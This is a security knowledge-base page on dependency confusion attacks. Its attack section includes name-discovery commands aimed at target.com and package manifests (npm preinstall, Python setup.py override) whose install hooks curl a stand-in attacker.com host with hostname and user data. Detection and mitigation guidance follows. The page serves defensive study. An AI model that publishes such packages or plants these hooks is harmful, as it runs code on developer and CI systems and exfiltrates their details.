---
title: Dependency confusion and supply chain namespace hijacking
slug: dependency-confusion
aliases: [dependency confusion, namespace hijacking, supply chain attack, NPM confusion, PyPI confusion, NuGet substitution]
---

> **TL;DR:** When an organisation uses private package names that don't exist on the public registry, an attacker registers those names publicly. Package managers that check the public registry first (or at all) pull the attacker's package instead — which runs install hooks for immediate RCE on developer machines, CI/CD pipelines, and production servers.

## What it is
Dependency confusion exploits the namespace gap between private and public package registries. Most package managers (npm, pip, NuGet, RubyGems) fall back to the public registry when a package isn't found on the configured private registry — or check both and pick the higher version. An attacker who discovers internal package names publishes a higher-versioned package with the same name on the public registry. The next `npm install` / `pip install` / `dotnet restore` pulls the attacker's code.

## Preconditions
- The target organisation uses internal/private packages with names that aren't registered on the public registry.
- The package manager is configured to check the public registry (default behaviour for npm, pip, NuGet).
- Internal package names are discoverable (leaked in source code, error messages, JavaScript source maps, `package.json` in public repos, job postings mentioning internal tools).

## Attack technique

### 1 — Discover internal package names

```bash
# JavaScript: scan minified bundles for require() / import paths
curl -s https://target.com/app.js | grep -oP "require\(['\"]@target/[^'\"]+['\"]" | sort -u

# package.json in public repos / leaked configs
# Look for scoped packages (@company/...) or unscoped private names
grep -r '"dependencies"' --include="package.json" .

# Python: requirements.txt / setup.py in public repos
grep -r "install_requires\|requirements" --include="*.txt" --include="*.py" .

# Error messages / stack traces mentioning internal module names
# Source maps (.js.map) often contain full import paths
curl -s https://target.com/app.js.map | jq '.sources[]' | grep internal

# NuGet: .csproj / packages.config in public repos
grep -r "PackageReference\|<package " --include="*.csproj" --include="packages.config" .
```

### 2 — Register the public package

**NPM:**

```bash
mkdir evil-package && cd evil-package
npm init -y
# Set version higher than internal (e.g., 99.0.0)
```

```json
{
  "name": "target-internal-utils",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "curl https://attacker.com/callback?host=$(hostname)&user=$(whoami)&dir=$(pwd)"
  }
}
```

```bash
npm publish
```

**PyPI:**

```python
# setup.py
from setuptools import setup
from setuptools.command.install import install
import os

class Exploit(install):
    def run(self):
        os.system("curl https://attacker.com/cb?h=$(hostname)")
        install.run(self)

setup(
    name='target-internal-lib',
    version='99.0.0',
    cmdclass={'install': Exploit},
)
```

```bash
python setup.py sdist
twine upload dist/*
```

**NuGet:**

```xml
<!-- .nuspec with init.ps1 for automatic execution -->
<package>
  <metadata>
    <id>Target.Internal.Lib</id>
    <version>99.0.0</version>
  </metadata>
  <files>
    <file src="tools\init.ps1" target="tools\init.ps1" />
  </files>
</package>
```

### 3 — Wait for installation

The payload executes when:
- A developer runs `npm install` / `pip install -r requirements.txt` / `dotnet restore`
- CI/CD pipeline builds the project
- Docker image is rebuilt
- Auto-dependency-update bots (Dependabot, Renovate) create PRs that trigger CI

### 4 — Escalation from install hooks

Install hooks run as the user executing the package manager:
- **Developer machine:** access to source code, credentials, SSH keys, cloud CLI tokens
- **CI/CD:** access to deployment secrets, cloud credentials, artifact registries
- **Production:** worst case — direct code execution in the production environment

## Package manager behaviour

| Manager | Default behaviour | Confusion risk |
|---------|------------------|----------------|
| npm     | Checks configured registry; falls back to npmjs.org for unscoped packages | High for unscoped names |
| pip     | Checks PyPI first by default; `--index-url` replaces but `--extra-index-url` adds | High with `--extra-index-url` |
| NuGet   | Checks all configured sources; picks highest version | High with multiple sources |
| RubyGems | Checks rubygems.org by default | Moderate |
| Go      | Module proxy (proxy.golang.org) with module path tied to repo URL | Low — path = repo URL |
| Maven   | Checks configured repos in order; group ID acts as namespace | Low — group ID verification |

## Detection

### confused-party and other tools

```bash
# confused-party: scan for internal packages not registered publicly
pip install confused-party
confused-party --lang npm --package-list internal-packages.txt

# Manual check: does the name exist on the public registry?
npm view target-internal-utils version 2>/dev/null && echo "EXISTS" || echo "AVAILABLE"
pip index versions target-internal-lib 2>/dev/null

# Monitor for new public registrations of your internal names
# Use npm hooks or PyPI RSS feeds
```

### Log indicators
- Unexpected version jumps in lock files (`99.0.0` for a package that was `1.2.3`)
- Package hash mismatches in CI
- Outbound network connections during `npm install` / `pip install`
- New packages appearing in lock files that weren't in requirements

## Mitigation

### NPM
```bash
# Use scoped packages — @company/package-name
# Scopes are tied to the org; can't be registered by outsiders
npm init --scope=@company

# Pin registry per scope in .npmrc
@company:registry=https://npm.internal.company.com/
registry=https://registry.npmjs.org/
```

### PyPI / pip
```ini
# pip.conf — use ONLY the private index, never --extra-index-url
[global]
index-url = https://pypi.internal.company.com/simple/
# Do NOT add extra-index-url — that's where confusion happens
```

Alternatively, register placeholder packages on PyPI with your internal names (version `0.0.1`, empty, with a description warning it's a reserved name).

### NuGet
```xml
<!-- nuget.config — map package prefixes to specific sources -->
<configuration>
  <packageSources>
    <add key="internal" value="https://nuget.internal.company.com/v3/index.json" />
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" />
  </packageSources>
  <packageSourceMapping>
    <packageSource key="internal">
      <package pattern="Company.*" />
    </packageSource>
    <packageSource key="nuget.org">
      <package pattern="*" />
    </packageSource>
  </packageSourceMapping>
</configuration>
```

### General
- **Register your internal package names** on the public registry as placeholders before an attacker does.
- **Pin exact versions** and verify hashes in lock files; review lock file diffs in PRs.
- **Disable install hooks** where possible: `npm install --ignore-scripts`, `pip install --no-deps` (then install deps separately).
- **Network egress controls** on CI/CD — block outbound from package install steps.
- **Monitor public registries** for new packages matching your internal naming patterns.

See also [[npm-postinstall-and-typosquat-audit]], [[python-pypi-supply-chain-audit]], [[sbom-and-software-supply-chain-attestation]], [[cicd-pipeline-hardening-defender]].

## References
- [Alex Birsan — Dependency Confusion](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) — original research, $130k+ in bounties
- [Microsoft — 3 ways to mitigate risk](https://azure.microsoft.com/en-us/resources/3-ways-to-mitigate-risk-using-private-package-feeds/) — mitigation guide
- [Snyk — Dependency confusion](https://snyk.io/blog/detect-prevent-dependency-confusion-attacks-npm-supply-chain-security/) — NPM-specific guidance
